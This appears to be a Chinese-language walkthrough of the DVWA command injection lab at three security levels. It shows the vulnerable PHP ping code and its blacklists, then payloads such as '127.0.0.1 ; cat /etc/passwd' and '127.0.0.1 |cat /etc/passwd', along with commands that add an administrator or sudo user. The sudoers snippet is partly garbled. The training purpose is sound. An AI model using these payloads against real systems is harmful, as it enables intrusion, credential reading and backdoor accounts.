<center>Command Injection命令注入</center>









## Command Injection命令注入

> 命令注入











### 1. low

> 低级
>
> 代码：[url](http://192.168.0.111:8000/vulnerabilities/view_source.php?id=exec&security=low)

```shell
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

> 没有做任何过滤
>
> linux/windowns 的基本命令

````shell
# win
127.0.0.1 && ipconfig
# 创建用户提升管理员
net user UserName PassWord /add
net localgroup Administrators UserName /add


# linux 等
127.0.0.1 ; ip addr
127.0.0.1 ; cat /etc/passwd 

# 创建用户
sudo useradd -m username    # -m 创建家目录
# 设置密码
sudo passwd username
# 添加到 sudo 组
sudo usermod -aG sudo username    # Ubuntu/Debian
# 或
sudo usermod -aG wheel usernam# 安全编辑 sudoers 文件
sudo visudo

# 添加以下行
username ALL=(ALL:ALL) ALLe   # CentOS/RHEL/Arch Linux
# 安全编辑 sudoers 文件
sudo visudo

# 添加以下行
username ALL=(ALL:ALL) ALL
````

> 扩展：

1. windows 的与或非

* 单个 & (简单连接符)：

```cmd
# 无条件执行后续命令，不管前面的命令是否成功
command1 & command2    # 两个命令都会执行

# 示例
dir & echo "这句话总会显示"
```



* 与操作 (AND)：

```cmd
# 使用 && 
command1 && command2    # command1 成功才执行 command2

# 示例
dir && echo "目录列表完成"
```

* 或操作 (OR)：

```cmd
# 使用 ||
command1 || command2    # command1 失败才执行 command2

# 示例
dir nonexist.txt || echo "文件不存在"
```

* 非操作 (NOT)：

```cmd
# 使用 NOT
IF NOT EXIST file.txt echo "文件不存在"

# 使用 !
IF !ERRORLEVEL! EQU 0 echo "命令成功"
```

* if判断

```cmd
:: IF 语句中的与或非
IF EXIST file.txt (
    IF NOT EXIST backup.txt (
        echo "file.txt 存在但 backup.txt 不存在"
    )
)

:: 组合使用
dir file.txt && echo "存在" || echo "不存在"
```





### 2. medium

> 中级
>
> 代码直接点击 `view source`

```shell
# 做了过滤
    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```

> 不使用`&&`和`;`字符

```shell
# win
127.0.0.1 & ipconfig

# linux
127.0.0.1 | ip addr
```





### 3. high

> 高级
>
> 代码

```php
# 做了更多字符过滤   
// Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

```

> 不加空格也可以

```shell
# windows
127.0.0.1 &&ipconfig

# linux
127.0.0.1 |cat /etc/passwd
```



